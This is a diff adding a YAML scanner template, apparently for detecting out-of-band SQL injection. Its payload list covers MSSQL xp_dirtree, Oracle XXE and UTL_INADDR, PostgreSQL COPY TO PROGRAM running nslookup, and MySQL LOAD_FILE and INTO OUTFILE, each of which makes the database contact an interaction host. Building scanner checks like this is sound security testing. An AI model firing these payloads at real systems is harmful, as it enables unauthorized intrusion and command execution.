@@ -1,0 +1,27 @@
+id: "sqli-oob"
+issue_code: sql_injection
+detection_conditions: or
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 90
+  - response_condition:
+      status_code: 500
+      confidence: 50
+  - response_check:
+      check: database_error
+      confidence: 90
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+templates:
+  - "'; exec master..xp_dirtree '//{{.oob_address}}/a'--"
+  - '||(SELECT extractvalue(xmltype(''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{.oob_address}}/"> %remote;]>''),''/l'') FROM dual)||'''
+  - SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{.oob_address}}/"> %remote;]>'),'/l') FROM dual
+  - SELECT UTL_INADDR.get_host_address('{{.oob_address}}')
+  - exec master..xp_dirtree '//{{.oob_address}}/a'
+  - copy (SELECT '') to program 'nslookup {{.oob_address}}'
+  - LOAD_FILE('\\\\{{.oob_address}}\\a')
+  - SELECT ... INTO OUTFILE '\\\\{{.oob_address}}\a'
+categories:
+  - sql_injection
